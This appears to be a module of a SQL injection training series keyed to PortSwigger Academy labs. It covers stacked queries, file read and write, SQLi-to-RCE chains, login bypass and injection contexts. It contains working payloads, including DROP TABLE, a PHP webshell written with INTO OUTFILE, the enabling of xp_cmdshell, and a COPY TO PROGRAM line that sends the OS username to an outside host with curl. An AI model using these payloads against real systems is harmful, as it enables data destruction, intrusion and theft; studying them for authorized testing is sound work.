# Advanced Topics — Stacked Queries, File I/O, RCE Chains, Auth Bypass, Injection Contexts

## 1. Stacked Queries

### 1.1 Mechanism
Some drivers/DBMS allow multiple statements separated by `;` to execute in a single request.
This turns SQLi from "manipulate the existing SELECT" into "execute an entirely new,
arbitrary statement" — including `INSERT`, `UPDATE`, `DROP`, or stored-procedure calls.

Support varies by DBMS/driver:
- **MSSQL** — stacked queries work by default via most drivers (ODBC, ADO).
- **PostgreSQL** — works by default via most drivers.
- **MySQL** — generally **disabled** by default unless the application explicitly enables
  multi-statement execution (e.g., PHP's `mysqli::multi_query`), so test for it but don't
  assume it's available.

```sql
'; DROP TABLE users--
```

Breakdown:
- `'` — closes the original string literal.
- `;` — statement separator, ending the original (now harmless) `SELECT` and opening a new
  statement.
- `DROP TABLE users` — an entirely new, arbitrary SQL statement, demonstrating that stacked
  queries escalate impact far beyond data theft into data destruction/integrity attacks.
- **Never actually run destructive payloads like this against a real target without explicit,
  written authorization for destructive testing** — demonstrate stacked-query capability with
  a harmless proof instead (below).

### 1.2 Safe Proof-of-Concept For Stacked Queries

```sql
'; WAITFOR DELAY '0:0:5'--
```

Breakdown: identical mechanism to the time-based delay in file 03 §4.3, but its presence here
specifically *proves stacked-query execution* (a standalone second statement, not just an
injected condition within the original `SELECT`) — a delay response confirms the database
accepted and executed a wholly separate statement.

## 2. File Read/Write Internals

### 2.1 MySQL — `LOAD_FILE()` (Read)

```sql
' UNION SELECT LOAD_FILE('/etc/passwd'),NULL--
```

Breakdown:
- `LOAD_FILE(path)` — MySQL built-in function reading a file's raw contents from disk into a
  string, returned as if it were a normal column value in the result set.
- Requires: the connected DB user has the `FILE` privilege, `secure_file_priv` is not
  restricting access to this path (a common hardening setting that, when set to a specific
  directory or empty disables this entirely), and the OS file permissions allow the MySQL
  process to read the target file.

### 2.2 MySQL — `INTO OUTFILE` (Write)

```sql
' UNION SELECT '<?php system($_GET["cmd"]); ?>',NULL INTO OUTFILE '/var/www/html/shell.php'--
```

Breakdown:
- `SELECT '<?php ... ?>'` — selects a literal string containing PHP webshell code as the
  "data" being written.
- `INTO OUTFILE 'path'` — writes the selected row's data directly to a file at the given
  path instead of returning it as a query result.
- For this to result in remote code execution, the destination path must be inside the web
  server's document root (so it's reachable over HTTP afterward) and the MySQL OS user must
  have write permission to that directory — both of these are far more often blocked by
  default in modern hardened deployments than the read primitive above.
- `system($_GET["cmd"])` inside the written PHP — once the file is written and reachable, a
  request like `shell.php?cmd=id` executes arbitrary OS commands, completing the chain from
  SQLi to full RCE.

### 2.3 MSSQL — `xp_cmdshell` (Direct Command Execution, No File Write Needed)

```sql
'; EXEC xp_cmdshell 'whoami'--
```

Breakdown:
- `EXEC xp_cmdshell 'command'` — an extended stored procedure that directly passes its string
  argument to the underlying Windows `cmd.exe` and returns the output — no intermediate file
  write step is needed at all, making this the most direct SQLi-to-RCE primitive covered here.
- `xp_cmdshell` is **disabled by default** since SQL Server 2005+; if disabled, it must first
  be re-enabled (requires `sysadmin`-level privileges):

```sql
'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE--
```

Breakdown:
- `sp_configure 'show advanced options',1` — unhides advanced server configuration options
  (a prerequisite gate, since `xp_cmdshell`'s own config option is itself hidden by default).
- `RECONFIGURE` — applies the just-changed configuration value immediately, required after
  every `sp_configure` change before it takes effect.
- `sp_configure 'xp_cmdshell',1` — the actual re-enable step, flipping the procedure back on.
- The second `RECONFIGURE` applies that change. This entire chain requires `sysadmin`
  privileges on the SQL Server instance — confirm via `--is-dba` (file 07) before attempting.

### 2.4 PostgreSQL — `COPY ... TO/FROM PROGRAM` (Requires Superuser)

```sql
'; COPY (SELECT '') TO PROGRAM 'curl http://attacker-collab.net/$(whoami)'--
```

Breakdown:
- `COPY (SELECT '') TO PROGRAM 'command'` — PostgreSQL's `COPY` statement, when targeting
  `PROGRAM` instead of a file path, pipes its output to an OS-level command instead of writing
  to disk — `curl ...` here is executed by the OS shell, with `$(whoami)` itself executed by
  that *outer* shell (command substitution) before curl even runs, so the resulting outbound
  request carries the OS username as part of the URL, both demonstrating RCE and exfiltrating
  data via OOB simultaneously (ties together files 04 and 08).
- Requires Postgres superuser privileges — far less commonly available on application-tier
  DB accounts than MSSQL's `sysadmin`/MySQL's `FILE` privilege equivalents.

## 3. SQLi-to-RCE Chain Summary

| DBMS | Primitive | Privilege Required | Chain |
|---|---|---|---|
| MySQL | `INTO OUTFILE` + reachable webroot | `FILE` priv, writable webroot | Write webshell → HTTP request → RCE |
| MSSQL | `xp_cmdshell` | `sysadmin` (or pre-enabled) | Direct command execution, no file write needed |
| PostgreSQL | `COPY ... TO PROGRAM` | Superuser | Direct command execution via OS pipe |
| Oracle | Java stored procedures / `DBMS_SCHEDULER` | Elevated package grants | More involved — typically requires chaining a Java-in-DB stored procedure deployment, out of scope for a quick payload but worth flagging as a finding-impact note |

## 4. Authentication Bypass Cheatsheet

```sql
' OR '1'='1
```
Breakdown: classic tautology (file 01 mechanism) — makes the `WHERE username=... AND
password=...` clause always true regardless of the real credentials supplied.

```sql
admin'--
```
Breakdown: closes the literal after a known/guessed username, then comments out the rest of
the query (including the `AND password='...'` check entirely) — logs in as `admin` with no
valid password needed at all, assuming the app only checks username existence post-bypass.

```sql
' OR 1=1--
```
Breakdown: same tautology pattern, numeric form — relevant when application input filtering
blocks quoted string comparisons but not bare numeric/operator syntax.

```sql
admin' OR '1'='1' LIMIT 1--
```
Breakdown: adds `LIMIT 1` to ensure the tautology only returns a single row even against a
multi-user table, avoiding a "multiple rows returned" application-layer error in apps that
naively expect exactly one matching user row from the login query.

```sql
' UNION SELECT 'admin','5f4dcc3b5aa765d61d8327deb882cf99'--
```
Breakdown: when the app constructs the session purely from the *query result* (rather than
comparing it against stored credentials beforehand), a UNION can fabricate an entirely
synthetic "matching" row — here injecting a literal username and a known MD5 hash (this
particular hash being the MD5 of the string `password`) directly as the row's content,
useful when the login flow's password check happens client-side or in application code that
trusts whatever the query returns as the source of truth.

PortSwigger lab mapping (Apprentice): **"SQL injection vulnerability allowing login bypass"**.

## 5. Injection Context Variations

### 5.1 `ORDER BY` Clause Injection

```sql
?sort=name' OR (SELECT 1 FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')='a
```

Breakdown:
- `ORDER BY` contexts can't use the same `UNION`/comment-out tricks cleanly in every case,
  since they sit at the very end of the query, after the `WHERE` clause — note the absence of
  a `--` here; this payload is structured to keep the *entire remaining original query*
  syntactically valid rather than commenting it out, since there's nothing meaningful left
  after `ORDER BY` to comment away.
- Boolean conditions work the same way as file 03, but the *signal* is the sort order itself
  changing (or erroring) rather than content appearing/disappearing — a true condition might
  alphabetically reorder results differently than a false one in some implementations, so test
  carefully and confirm signal reliability before automating extraction here.
- Time-based is generally the more reliable technique in `ORDER BY` contexts specifically,
  since it doesn't depend on interpreting subtle sort-order differences:

```sql
?sort=name,(SELECT SLEEP(5))
```

Breakdown: appends a second sort key that's a subquery; evaluating that subquery as part of
determining sort order forces the `SLEEP(5)` call to execute regardless of the actual sort
outcome, giving an unambiguous timing signal.

PortSwigger lab mapping (Practitioner): **"SQL injection vulnerability in the ORDER BY
clause"**.

### 5.2 `INSERT`/`UPDATE` Statement Injection

```sql
'); UPDATE users SET password='hacked' WHERE username='admin'--
```

Breakdown:
- `');` — closes whatever value-list parenthesis context the original `INSERT` was using
  (e.g., `INSERT INTO logs (note) VALUES ('...')`) and terminates that statement.
- `UPDATE users SET password='hacked' WHERE username='admin'` — an entirely new stacked
  statement (requires stacked-query support per section 1), demonstrating that injection
  points inside `INSERT`/`UPDATE` value contexts can pivot to modifying unrelated tables
  entirely, not just the one the original statement targeted.
- Without stacked-query support, injection inside an `INSERT`'s values is still useful via
  boolean/error/time-based blind techniques applied to a subquery embedded in the value
  itself, e.g.: `'||(SELECT CASE WHEN (1=1) THEN '' ELSE 1/0 END)||'` (same mechanism as file
  05's second-order example).

PortSwigger lab mapping (Practitioner-adjacent): exercised within **"SQL injection vulnerability
in a different context"**-style Academy labs depending on current Academy lab set; treat the
underlying mechanism above as DBMS/context-agnostic and adapt to whichever specific lab
presents an `INSERT`/`UPDATE` sink.

### 5.3 HTTP Header-Based Injection

```
User-Agent: Mozilla/5.0' AND SLEEP(5)--
```

Breakdown:
- Many apps log the `User-Agent` (and `X-Forwarded-For`, `Referer`, etc.) header value
  directly into a database via an unparameterized `INSERT` (analytics/logging tables are a
  classic culprit), making the header itself an injection point even though it's never part
  of the visible URL or form data.
- The payload mechanism is identical to any other blind time-based injection (file 03) — only
  the *delivery location* (an HTTP header instead of a query/POST parameter) differs.
- Always test `X-Forwarded-For`, `X-Real-IP`, `Referer`, and `User-Agent` explicitly during
  any assessment — these are commonly missed by scanners that only fuzz standard
  parameters, and sqlmap's `--level=5` (file 07 §1.3) is specifically needed to test these by
  default.

## 6. Real-World Notes

- **Common mistake:** Assuming `xp_cmdshell`/`INTO OUTFILE` failures mean "not exploitable" —
  these are high-privilege primitives that are frequently locked down even when the underlying
  SQLi is fully confirmed and exploitable for data extraction; report the SQLi regardless of
  whether the RCE chain specifically succeeds.
- **Engagement reality:** Full SQLi-to-RCE chains are the highest-impact findings in any
  pentest report and often the single finding that most influences remediation budget/urgency
  — but they also carry real operational risk (writing files to a production webroot, enabling
  `xp_cmdshell` on a production instance). Always get explicit written authorization for this
  specific class of testing before attempting it, separate from general SQLi testing
  authorization.
- **Report-writing tip:** For auth bypass findings, always note *which specific mechanism*
  worked (tautology vs. comment-based vs. UNION-fabricated row) — this materially changes the
  recommended fix (e.g., comment-based bypass surviving suggests the app isn't even checking
  query *row count* before granting access, a deeper logic flaw beyond just "use prepared
  statements").

## Next File
→ `09-cheatsheet-lab-mapping.md` — Final consolidated cheatsheet and full PortSwigger Academy
lab progression mapping.
